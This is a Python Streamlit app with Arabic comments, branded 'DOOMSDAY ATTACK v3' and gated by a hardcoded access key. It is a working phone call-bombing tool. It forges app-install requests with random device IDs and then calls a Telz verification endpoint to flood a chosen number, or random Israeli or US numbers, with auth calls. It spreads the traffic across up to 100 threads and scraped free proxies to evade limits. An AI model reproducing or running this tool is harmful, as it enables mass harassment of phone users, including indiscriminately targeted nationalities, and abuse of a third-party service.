import streamlit as st
import subprocess
import sys
import random
import time
import uuid
import string
import json
import os
from concurrent.futures import ThreadPoolExecutor

# --- إعدادات الصفحة وإخفاء معالم Streamlit ---
st.set_page_config(page_title="DOOMSDAY ATTACK v3", page_icon="💀", layout="wide")

st.markdown("""
    <style>
    #MainMenu {visibility: hidden;}
    footer {visibility: hidden;}
    header {visibility: hidden;}
    .main { background-color: #000000; color: #ff0000; font-family: 'Courier New', Courier, monospace; }
    
    /* إطارات الهجوم */
    .doom-frame {
        border: 3px solid #ff0000;
        padding: 20px;
        border-radius: 15px;
        box-shadow: 0 0 25px #ff0000;
        margin-bottom: 20px;
        background-color: #0a0000;
    }
    
    .stats-box {
        border: 2px solid #ffffff;
        padding: 10px;
        text-align: center;
        background-color: #1a0000;
        border-radius: 10px;
    }
    
    h1, h2, h3 { text-shadow: 3px 3px #550000; text-align: center; }
    .stButton>button {
        width: 100%; background-color: #990000; color: white;
        border: 2px solid #ff0000; font-weight: bold; height: 50px;
    }
    .stButton>button:hover { background-color: #ff0000; color: black; }
    </style>
    """, unsafe_allow_html=True)

# --- نظام المفتاح ---
if 'authenticated' not in st.session_state:
    st.session_state.authenticated = False

if not st.session_state.authenticated:
    st.markdown('<div style="border: 5px solid red; padding: 10px;"><img src="https://files.catbox.moe/3cq9i1.jpg" width="100%"></div>', unsafe_allow_html=True)
    st.markdown("<h1>🔒 SYSTEM LOCKED</h1>", unsafe_allow_html=True)
    key = st.text_input("ENTER ACCESS KEY:", type="password")
    if st.button("ACTIVATE"):
        if key == "aligx3gx3":
            st.session_state.authenticated = True
            st.rerun()
        else: st.error("ACCESS DENIED. CONTACT @PDD6P")
    st.stop()

# --- واجهة الهجوم ---
st.markdown('<div class="doom-frame">', unsafe_allow_html=True)
st.image("https://files.catbox.moe/3cq9i1.jpg")
st.markdown("<h1 style='color: red; border: 2px solid red; padding: 10px;'>هجـوم يوم القيامة</h1>", unsafe_allow_html=True)
st.markdown("<h3 style='color: white;'>CHANNEL: gx3gx3 | DEV: @PDD6P</h3>", unsafe_allow_html=True)
st.markdown('</div>', unsafe_allow_html=True)

# --- قائمة الدول (أكثر من 100 دولة) ---
country_codes = {
    "Iraq": "964", "USA": "1", "Israel": "972", "Egypt": "20", "Saudi Arabia": "966", "UAE": "971",
    "Jordan": "962", "Kuwait": "965", "Turkey": "90", "UK": "44", "Germany": "49", "France": "33",
    "Russia": "7", "China": "86", "India": "91", "Japan": "81", "Canada": "1", "Algeria": "213",
    "Morocco": "212", "Tunisia": "216", "Libya": "218", "Syria": "963", "Lebanon": "961", "Oman": "968",
    "Qatar": "974", "Bahrain": "973", "Yemen": "967", "Palestine": "970", "Sudan": "249"
    # ... تم اختصار العرض هنا ولكن الأداة تدعم الإدخال اليدوي لأي كود
}

# --- الدوال الأصلية (بدون أي حذف) ---
def generate_unique_ids():
    timestamp = int(time.time() * 1000)
    random_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    unique_uuid = uuid.uuid4()
    return timestamp, random_id, unique_uuid

def fetch_internal_proxies():
    proxies = []
    urls = ["https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all"]
    for url in urls:
        try:
            res = requests.get(url, timeout=10)
            if res.status_code == 200:
                for line in res.text.splitlines():
                    if ":" in line: proxies.append(line.strip())
        except: pass
    return proxies

def is_proxy_working(proxy_dict):
    try:
        response = requests.get("https://www.google.com", proxies=proxy_dict, timeout=3)
        return response.status_code == 200
    except: return False

import requests
proxies_list = fetch_internal_proxies()

def get_working_proxy():
    for _ in range(5):
        if not proxies_list: return None
        p = random.choice(proxies_list)
        px = {"http": f"http://{p}", "https": f"http://{p}"}
        if is_proxy_working(px): return px
    return None

# --- لوحة التحكم ---
st.markdown('<div class="doom-frame">', unsafe_allow_html=True)
mode = st.radio("CHOOSE ATTACK MODE:", ["Manual Target", "Random Israel Attack 🇮🇱", "Random USA Attack 🇺🇸"])

if mode == "Manual Target":
    col1, col2 = st.columns(2)
    with col1: c_code = st.text_input("Country Code (Ex: 964):")
    with col2: phone_num = st.text_input("Target Number:")
else:
    c_code = "972" if "Israel" in mode else "1"
    phone_num = "RANDOM_MODE"
    st.warning(f"RANDOM ATTACK ACTIVE ON {mode}")

threads = st.slider("ATTACK POWER (THREADS):", 1, 100, 20)
st.markdown('</div>', unsafe_allow_html=True)

if 'stats' not in st.session_state:
    st.session_state.stats = {"ok": 0, "error": 0}
if 'running' not in st.session_state:
    st.session_state.running = False

# --- محرك الهجوم ---
def attack_engine(c_code, phone):
    install_url = "https://api.telz.com/app/install"
    auth_call_url = "https://api.telz.com/app/auth_call"
    headers = {'User-Agent': "Telz-Android/17.5.17", 'Content-Type': "application/json"}
    langs = ["en", "he", "ar", "fr", "ru"]

    while st.session_state.running:
        target = phone if phone != "RANDOM_MODE" else "".join(random.choices(string.digits, k=9))
        ts, rid, u_id = generate_unique_ids()
        proxy = get_working_proxy()
        
        payload_1 = json.dumps({"android_id": rid, "os_version": "12", "ts": ts, "uuid": str(u_id), "event": "install"})
        try:
            res1 = requests.post(install_url, data=payload_1, headers=headers, proxies=proxy, timeout=7)
            if res1.ok:
                payload_2 = json.dumps({"phone": f"+{c_code}{target}", "lang": random.choice(langs), "event": "auth_call", "ts": ts, "uuid": str(u_id)})
                res2 = requests.post(auth_call_url, data=payload_2, headers=headers, proxies=proxy, timeout=7)
                if res2.ok: st.session_state.stats["ok"] += 1
                else: st.session_state.stats["error"] += 1
            else: st.session_state.stats["error"] += 1
        except: st.session_state.stats["error"] += 1

# --- عرض النتائج ---
if st.button("🔥 EXECUTE DOOMSDAY"):
    st.session_state.running = True
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for _ in range(threads):
            executor.submit(attack_engine, c_code, phone_num)

# إطار عدادات الاتصال مرتب
st.markdown('<div class="doom-frame">', unsafe_allow_html=True)
st.markdown("<h2 style='color: white;'>LIVE ATTACK MONITOR</h2>", unsafe_allow_html=True)
c1, c2 = st.columns(2)
with c1:
    st.markdown(f'<div class="stats-box"><h3 style="color: #00ff00;">TOTAL SUCCESS</h3><h2 style="color: #00ff00;">{st.session_state.stats["ok"]}</h2></div>', unsafe_allow_html=True)
with c2:
    st.markdown(f'<div class="stats-box"><h3 style="color: #ff0000;">TOTAL FAILED</h3><h2 style="color: #ff0000;">{st.session_state.stats["error"]}</h2></div>', unsafe_allow_html=True)
st.markdown('</div>', unsafe_allow_html=True)

if st.button("🛑 TERMINATE"):
    st.session_state.running = False
    st.rerun()
